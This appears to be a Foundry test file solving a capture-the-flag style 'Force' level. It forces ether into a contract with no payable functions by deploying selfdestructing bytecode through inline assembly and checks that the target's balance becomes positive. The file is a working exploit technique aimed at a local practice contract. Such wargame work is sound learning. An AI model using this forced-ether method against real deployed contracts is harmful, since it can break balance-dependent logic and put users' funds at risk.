pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract Boom {
    constructor(address payable _force) payable {
        assembly {
            selfdestruct(_force)
        }
    }
}

contract ASMForce is Test {
    address target;
    bytes bytecode =
        hex"608060405260405160503803806050833981016040819052601e916021565b80ff5b600060208284031215603257600080fd5b81516001600160a01b0381168114604857600080fd5b939250505056fe";

    function setUp() public {
        target = address(new Force());
        vm.deal(address(this), 1);
    }

    function testAttackForce() public {
        assembly {
            let ptr := mload(0x40)

            // we know there are more than 32 bytes so the data in the slot is the length
            let bytecode_length := div(sload(bytecode.slot), 2)

            // we can get the start of the storage location of the data by hashing the slot
            mstore(ptr, bytecode.slot)
            let bytecode_start := keccak256(ptr, 0x20)
            // update the pointer after the hashed value
            ptr := add(ptr, 0x20)

            // whole slots used by our dynamic bytearray are the array length / 64
            let slots := div(bytecode_length, 0x20)

            // we also add 1 for a partial slot if needed
            // this would be the case if slots (from integer division) * 64 == bytecode_length
            // indicating no remainders
            if not(eq(mul(0x20, slots), bytecode_length)) {
                slots := add(slots, 1)
            }

            // begin the loop, saving the start location of the data in memory
            let startPtr := ptr
            for {
                let i := 0
            } lt(i, slots) {
                i := add(i, 1)
            } {
                // grab the data from the adjacent slot
                let data := sload(add(bytecode_start, i))
                // save the data
                mstore(ptr, data)
                // each time we load into memory, increment the pointer by 0x20 bytes
                ptr := add(ptr, 0x20)
            }

            // now we need to add the constructor argument to the bytecode
            // this is postfixed to the bytecode so we move the ptr back to the end of the bytecode
            ptr := add(startPtr, bytecode_length)

            // mstore pads the address in the correct format so no additional manipulation needed
            mstore(ptr, sload(target.slot))

            // we have now loaded the full init + runtime code to memory
            // we can pass the memory start offset and length to the create opcode
            // which will create a new sub context and return us the address where the init bytecode is deployed
            let attackContract := create(
                1,
                startPtr,
                add(bytecode_length, 0x20)
            )
        }

        assertGt(target.balance, 0);
    }
}
